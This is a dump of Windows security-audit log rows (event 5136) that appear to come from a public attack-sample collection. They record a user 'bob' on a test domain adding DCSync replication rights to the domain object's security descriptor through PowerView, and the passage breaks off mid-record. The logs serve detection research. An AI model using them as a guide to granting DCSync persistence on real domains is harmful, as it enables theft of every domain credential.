2019-03-25T21:28:45.025627+00:00,Powerview Add-DomainObjectAcl DCSync AD Extend Right,data/EVTX-ATTACK-SAMPLES/Persistence/DACL_DCSync_Right_Powerview_ Add-DomainObjectAcl.evtx,1,Microsoft-Windows-Security-Auditing,5136,198242601,DC1.insecurebank.local,"OpCorrelationID: 8E6BE6CD-81E7-4C8C-8EB0-50CA85B4950C
AppCorrelationID: '-'
AttributeSyntaxOID: 2.5.5.15
ObjectDN: DC=insecurebank,DC=local
SubjectLogonId: '0x40f2719'
DSType: '%%14676'
ObjectGUID: C6FAF700-BFE4-452A-A766-424F84C29583
AttributeLDAPDisplayName: nTSecurityDescriptor
SubjectDomainName: insecurebank
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-1108
ObjectClass: domainDNS
DSName: insecurebank.local
AttributeValue: O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)
OperationType: '%%14674'
SubjectUserName: bob
"
2019-03-25T21:28:45.025627+00:00,Powerview Add-DomainObjectAcl DCSync AD Extend Right,data/EVTX-ATTACK-SAMPLES/Persistence/DACL_DCSync_Right_Powerview_ Add-DomainObjectAcl.evtx,1,Microsoft-Windows-Security-Auditing,5136,198242598,DC1.insecurebank.local,"OpCorrelationID: 77B63738-C25C-4FBD-BA96-A7ABE17A22A3
AppCorrelationID: '-'
AttributeSyntaxOID: 2.5.5.15
ObjectDN: DC=insecurebank,DC=local
SubjectLogonId: '0x40f2719'
DSType: '%%14676'
ObjectGUID: C6FAF700-BFE4-452A-A766-424F84C29583
AttributeLDAPDisplayName: nTSecurityDescriptor
SubjectDomainName: insecurebank
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-1108
ObjectClass: domainDNS
DSName: insecurebank.local
AttributeValue: O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)
OperationType: '%%14675'
SubjectUserName: bob
"
2019-03-25T21:28:45.025627+00:00,Powerview Add-DomainObjectAcl DCSync AD Extend Right,data/EVTX-ATTACK-SAMPLES/Persistence/DACL_DCSync_Right_Powerview_ Add-DomainObjectAcl.evtx,1,Microsoft-Windows-Security-Auditing,5136,198242599,DC1.insecurebank.local,"OpCorrelationID: 77B63738-C25C-4FBD-BA96-A7ABE17A22A3
AppCorrelationID: '-'
AttributeSyntaxOID: 2.5.5.15
ObjectDN: DC=insecurebank,DC=local
SubjectLogonId: '0x40f2719'
DSType: '%%14676'
ObjectGUID: C6FAF700-BFE4-452A-A766-424F84C29583
AttributeLDAPDisplayName: nTSecurityDescriptor
SubjectDomainName: insecurebank
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-1108
ObjectClass: domainDNS
DSName: insecurebank.local
AttributeValue: O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)
OperationType: '%%14674'
SubjectUserName: bob
"
2019-03-25T21:28:45.026630+00:00,Powerview Add-DomainObjectAcl DCSync AD Extend Right,data/EVTX-ATTACK-SAMPLES/Persistence/DACL_DCSync_Right_Powerview_ Add-DomainObjectAcl.evtx,1,Microsoft-Windows-Security-Auditing,5136,198242605,DC1.insecurebank.local,"OpCorrelationID: 9F3DCF8F-49DF-4DB9-AA5F-09B804ADDD96
AppCorrelationID: '-'
AttributeSyntaxOID: 2.5.5.15
ObjectDN: DC=insecurebank,DC=local
SubjectLogonId: '0x40f2719'
DSType: '%%14676'
ObjectGUID: C6FAF700-BFE4-452A-A766-424F84C29583
AttributeLDAPDisplayName: nTSecurityDescriptor
SubjectDomainName: insecurebank
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-1108
ObjectClass: domainDNS
DSName: insecurebank.local
AttributeValue: O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)
OperationType: '%%14674'
SubjectUserName: bob
"
2019-03-25T21:28:45.026630+00:00,Powerview Add-DomainObjectAcl DCSync AD Extend Right,data/EVTX-ATTACK-SAMPLES/Persistence/DACL_DCSync_Right_Powerview_ Add-DomainObjectAcl.evtx,1,Microsoft-Windows-Security-Auditing,5136,198242604,DC1.insecurebank.local,"OpCorrelationID: 9F3DCF8F-49DF-4DB9-AA5F-09B804ADDD96
AppCorrelationID: '-'
AttributeSyntaxOID: 2.5.5.15
ObjectDN: DC=insecurebank,DC=local
SubjectLogonId: '0x40f2719'
DSType: '%%14676'
ObjectGUID: C6FAF700-BFE4-452A-A766-424F84C29583
AttributeLDAPDisplayName: nTSecurityDescriptor
SubjectDomainName: insecurebank
SubjectUserSid: S-1-5-21-738609754-2819869699-4189121830-1108
ObjectClass: domainDNS
DSName: insecurebank.local
AttributeValue: O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbe